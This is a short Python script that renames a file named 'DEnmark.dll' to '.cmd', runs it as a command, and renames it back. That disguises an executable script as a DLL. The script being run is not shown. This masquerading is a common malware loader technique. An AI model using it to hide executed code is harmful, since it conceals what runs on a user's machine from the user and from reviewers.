import os

os.chdir("encdec")
os.rename("DEnmark.dll", "DEnmark.cmd")
os.system("DEnmark.cmd")
os.rename("DEnmark.cmd", "DEnmark.dll")
